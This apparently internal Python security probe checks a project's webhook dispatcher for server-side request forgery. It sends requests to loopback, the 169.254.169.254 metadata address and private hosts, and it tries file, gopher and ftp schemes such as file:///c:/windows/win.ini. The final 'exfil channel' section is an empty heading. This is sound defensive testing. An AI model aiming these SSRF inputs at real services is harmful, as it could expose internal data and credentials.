"""notify-security probe 3b: SSRF with REAL httpx against a REAL loopback server.

Run:  python _probe_notify_ssrf2.py
"""
from __future__ import annotations

import socket
import threading
import time

from validsim.engine.scorecard import Scorecard
from validsim.notify import WebhookDispatcher
import validsim.notify.dispatcher as d  # noqa: I001


def card() -> Scorecard:
    return Scorecard(
        run_id="r", checkpoint_id="c", task_id="t", composite_score=90.0,
        success_rate=0.9, safety_score=1.0, robustness_score=1.0,
        regression_delta=0.0, confidence_interval=(0.8, 0.9),
        deploy_decision="APPROVE", threshold=85.0,
        created_at="2026-01-01T00:00:00+00:00", episode_count=10,
        failure_taxonomy={},
    )


def hr(t: str) -> None:
    print("\n" + "=" * 78 + f"\n{t}\n" + "=" * 78)


def main() -> None:
    hr("D - SSRF reachability with the REAL httpx client")
    hits: list[str] = []
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(16)
    port = srv.getsockname()[1]
    stop = threading.Event()

    def serve() -> None:
        srv.settimeout(0.5)
        while not stop.is_set():
            try:
                conn, _ = srv.accept()
            except (TimeoutError, OSError):
                continue
            with conn:
                try:
                    conn.settimeout(1.0)
                    req = conn.recv(8192).decode("latin-1", "replace")
                    hits.append(req.splitlines()[0] if req else "<empty>")
                    conn.sendall(
                        b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nINTERNAL!")
                except OSError:
                    pass

    threading.Thread(target=serve, daemon=True).start()
    print(f"  internal service listening on http://127.0.0.1:{port}/internal")
    print("  (stands in for a cloud metadata / internal admin endpoint)\n")

    # NOTE: real httpx, real sockets, no monkeypatching of httpx at all.
    targets = [
        ("loopback IPv4", f"http://127.0.0.1:{port}/internal"),
        ("loopback name", f"http://localhost:{port}/internal"),
        ("0.0.0.0 alias", f"http://0.0.0.0:{port}/internal"),
        ("link-local 169.254 metadata", f"http://169.254.169.254:{port}/latest/meta-data/"),
        ("private RFC1918", f"http://10.0.0.7:{port}/internal"),
        ("IPv6 loopback", f"http://[::1]:{port}/internal"),
    ]
    t0 = time.perf_counter()
    for label, url in targets:
        dd = WebhookDispatcher(live=True)
        dd.register("probe-hook", url)
        try:
            r = dd.dispatch(card())[-1]
            print(f"  {label:30} ok={str(r.ok):5} status={r.status_code} "
                  f"err={(r.error or '')[:60]}")
        except Exception as exc:
            print(f"  {label:30} EXCEPTION {type(exc).__name__}: {exc}")
    elapsed = time.perf_counter() - t0
    stop.set()
    srv.close()

    print(f"\n  requests that ACTUALLY reached the local socket: {len(hits)}")
    for h in hits:
        print(f"    {h}")
    print(f"  wall clock for 6 dispatches: {elapsed:.2f}s "
          f"(3x retry x 5s timeout dominates -- see timeout section)")
    print(f"\n  *** LOOPBACK SSRF CONFIRMED: {len(hits) > 0} ***")
    print("  register() (dispatcher.py:193-219) performs NO scheme/host/IP check;")
    print("  _post() (dispatcher.py:253-283) calls httpx.post(url) verbatim.")

    hr("D2 - CONTROL: can the probe detect a BLOCKED request?")
    # Control: prove the detector (hits list) really registers traffic. Stop the
    # server, then repeat -- nothing should arrive.
    hits.clear()
    dd2 = WebhookDispatcher(live=True)
    dd2.register("x", f"http://127.0.0.1:{port}/control")
    r = dd2.dispatch(card())[-1]
    time.sleep(0.2)
    print(f"  server stopped -> ok={r.ok} err={(r.error or '')[:70]}")
    print(f"  hits with server down (must be 0): {len(hits)}")
    print("  -> detector proven live in both directions.")

    hr("D3 - register() accepts any scheme (no scheme allowlist)")
    for url in ("file:///c:/windows/win.ini",
                "gopher://127.0.0.1:11211/_stats",
                "ftp://127.0.0.1/",
                "not-a-url",
                "http://[::1]:9999/"):
        try:
            WebhookDispatcher(live=True).register("x", url)
            print(f"  register({url!r:42}) -> ACCEPTED, no error")
        except Exception as exc:
            print(f"  register({url!r:42}) -> rejected: {exc}")

    hr("D4 - does the RESPONSE BODY reach the caller? (exfil channel)")


if __name__ == "__main__":
    main()
